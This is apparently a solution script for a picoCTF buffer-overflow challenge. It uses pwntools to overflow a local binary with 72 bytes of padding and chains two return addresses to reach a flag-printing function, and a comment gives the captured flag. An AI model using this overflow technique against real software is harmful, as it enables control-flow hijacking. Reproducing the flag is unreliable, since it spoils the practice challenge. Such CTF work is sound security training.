#!/usr/bin/env python3

from pwn import *

s = process('./vuln')
s.recvuntil('\n')
payload = b'A'*72
payload += p64(0x00000000004007e8) # main_func
payload += p64(0x0000000000400767) # flag_func

# python -c 'print "A"*72 + b"\xe8\x07\x40\x00\x00\x00\x00\x00" + b"\x67\x07\x40\x00\x00\x00\x00\x00"'
# picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_72d3e39f}

s.sendline(payload) 
s.interactive()
